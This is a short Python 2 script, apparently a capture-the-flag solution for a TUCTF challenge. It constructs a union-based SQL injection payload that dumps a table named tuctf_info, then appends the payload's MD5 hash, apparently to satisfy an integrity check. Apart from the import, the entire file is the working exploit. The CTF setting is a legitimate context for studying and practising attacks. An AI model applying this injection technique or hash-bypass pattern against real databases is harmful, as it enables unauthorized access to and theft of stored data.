#!/usr/bin/python
import hashlib


p = "boby' and '1'='2' union select group_concat(concat(item,0x20,value)),1 " \
    "from tuctf_info order by '"

h = hashlib.md5(p)
print "\n\n" + p + "+" + h.hexdigest()
